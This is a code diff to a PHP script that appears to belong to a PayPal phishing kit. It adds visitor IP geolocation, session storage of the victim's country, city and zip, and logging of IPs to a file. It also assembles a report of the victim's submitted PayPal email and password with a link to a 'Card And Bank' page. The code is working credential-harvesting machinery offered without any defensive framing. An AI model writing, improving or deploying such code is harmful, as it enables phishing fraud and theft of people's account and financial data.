@@ -4,9 +4,46 @@ session_start();
 error_reporting(0);
 
 $TIME_DATE = date('H:i:s d/m/Y');
-include('../../functions/get_ip.php');
 include('../../functions/get_bin.php');
 include('../../functions/get_browser.php');
+
+
+//////////////////////////////////////// GET Country & Country CODE ! ////////////////////////////////////////////////
+$client  = @$_SERVER['HTTP_CLIENT_IP'];
+$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+$remote  = @$_SERVER['REMOTE_ADDR'];
+$result  = "Unknown";
+if(filter_var($client, FILTER_VALIDATE_IP)){
+    $ip = $client;
+}
+elseif(filter_var($forward, FILTER_VALIDATE_IP)){
+    $_SESSION['_ip_'] = $ip = $forward;
+}
+else{
+    $_SESSION['_ip_'] = $ip = $remote;
+}
+$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$_SESSION['_ip_']));
+$LOOKUP_COUNTRY = $IP_LOOKUP->country;
+$LOOKUP_CNTRCODE= $IP_LOOKUP->countryCode;
+$LOOKUP_CITY    = $IP_LOOKUP->city;
+$LOOKUP_REGION  = $IP_LOOKUP->region;
+$LOOKUP_STATE   = $IP_LOOKUP->regionName;
+$LOOKUP_ZIPCODE = $IP_LOOKUP->zip;
+echo  $LOOKUP_COUNTRY;
+$_SESSION['_LOOKUP_COUNTRY_'] = $LOOKUP_COUNTRY;
+$_SESSION['_LOOKUP_CNTRCODE_']= $LOOKUP_CNTRCODE;
+$_SESSION['_LOOKUP_CITY_']    = $LOOKUP_CITY;
+$_SESSION['_LOOKUP_REGION_']  = $LOOKUP_REGION;
+$_SESSION['_LOOKUP_STATE_']   = $LOOKUP_STATE;
+$_SESSION['_LOOKUP_ZIPCODE_'] = $LOOKUP_ZIPCODE;
+$_SESSION['_LOOKUP_REGIONS_'] = $_SESSION['_LOOKUP_STATE_']."(".$_SESSION['_LOOKUP_REGION_'].")";
+$_SESSION['_forlogin_'] = $_SESSION['_LOOKUP_CNTRCODE_']." - ".$_SESSION['_ip_'];
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+$LOGS = "[".date('Y-m-d H:i:s')."] ".$_SESSION['_LOOKUP_CNTRCODE_']." - ".$_SESSION['_ip_']."";
+file_put_contents('../../logs.txt', $LOGS . PHP_EOL, FILE_APPEND);
+
+
+
 
 //
 function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
@@ -89,7 +126,7 @@ $Z118_MESSAGE .= "
                                                                                                                                                                                                                                              
    <font style='color: rgb(128, 129, 131);'>&#10112; PP Email   :</font>  <font style='color: rgb(235, 79, 60);'> ".$_POST['login_email']."</font>
    <font style='color: rgb(128, 129, 131);'>&#10112; PP Password :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['login_password']."</font>
-<font style='color: rgb(128, 129, 131);'>&#10112; Country Name  :</font>  <font style='color: rgb(65, 66, 68);'> ".countrGy."</font>
+<font style='color: rgb(128, 129, 131);'>&#10112; Country Name  :</font>  <font style='color: rgb(65, 66, 68);'> ".$LOOKUP_COUNTRY."</font>
    
       <font style='color: rgb(128, 129, 131);'>&#10112; More   :</font>  <font style='color: rgb(60, 118, 235);'> <a href = '../users/tnt2.html'>Card And Bank</a></font>
    <font style='color: rgb(128, 129, 131);'>&#10114; IP          :</font>  <font style='color: rgb(60, 118, 235);'><a target='_blank' style='text-decoration:none;' href='http://www.geoiptool.com/?IP=".$_SERVER['REMOTE_ADDR']."'>".$_SERVER['REMOTE_ADDR']."</a></font> 
